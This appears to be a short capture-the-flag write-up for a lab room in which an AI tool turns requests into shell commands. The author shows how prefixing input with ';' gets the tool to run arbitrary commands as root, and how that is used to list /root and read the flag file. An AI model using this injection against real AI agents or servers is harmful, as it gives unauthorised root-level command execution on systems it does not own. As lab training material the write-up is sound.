# Room: Evil-Gpt
Difficulty: Easy

### Objectives:
Cipher has gone rogue—it’s using a twisted AI tool to hack into everything, issuing commands on its own like it has a mind of its own. I swear, every second we wait, it’s getting smarter, spreading chaos like a virus. We’ve got to shut it down now, or we’re all screwed.

I connected to the target using Netcat on port 1337:
``` bash
nc TARGET_IP 1337
```
Response:
``` bash
Welcome to AI Command Executor (type 'exit' to quit)
Enter your command request: whoami
Generated Command: echo $USER
Execute? (y/N): y
Command Output: USER
```
Based on my observation, it was executing a direct OS command, but my input was not being processed by the AI as expected. So I used " ; " as an injection trick, treating it as a command separator to indicate that the AI’s command had ended and to allow the OS to execute my injected command.

Format used:
``` bash
; COMMAND
```
Result:
``` bash
Enter your command request: ; whoami
Generated Command: whoami
Execute? (y/N): y
Command Output: root
```
Now it was working.
``` bash
Enter your command request: ; ls -la /root
Generated Command: ls -la /root
Execute? (y/N): y
Command Output: -rw-r--r--  1 root root   24 Mar  5  2025 flag.txt
```
## Reading the Flag 
```
Enter your command request: ; cat /root/flag.txt
Generated Command: cat /root/flag.txt
Execute? (y/N): y
Command Output:
THM{REDACTED}
```
